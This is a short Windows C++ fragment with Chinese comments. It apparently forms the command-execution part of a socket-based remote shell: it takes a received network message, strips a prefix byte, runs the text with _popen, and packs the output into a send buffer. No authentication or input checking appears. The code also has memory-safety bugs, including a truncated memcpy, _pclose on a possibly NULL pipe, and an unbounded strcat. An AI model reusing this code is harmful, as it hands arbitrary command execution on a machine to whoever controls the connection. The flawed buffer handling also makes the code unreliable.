#include<winsock.h>
#include <iostream>
char send_msg[1024]="default_msg";
char recv_msg[1024];
char cmd_result[1024];
/////////////////执行cmd命令/////////////////////////
int extend_cmd(char*){//正常返回1，错误返回0

	for(int i=0; i+1<sizeof(recv_msg);i=i+1)
	{
		recv_msg[i]=recv_msg[i+1];
	}//处理收到的字符串
	FILE *fp = _popen(recv_msg, "r");//创建管道
	if ((fp) == NULL) {
		std::cout<<"run cmd pip happen fault"<<std::endl;
		memcpy(send_msg,"run cmd pip happen fault",14);
	}else{
		while (fgets(send_msg, 1024, fp) != NULL) {strcat(cmd_result,send_msg);}//拼接管道数据
		memcpy(send_msg,cmd_result,sizeof(cmd_result));
	}
	_pclose(fp);
	memset(cmd_result, 0, 1024);
	return 1;
}
////////////////////////////////////////////////////

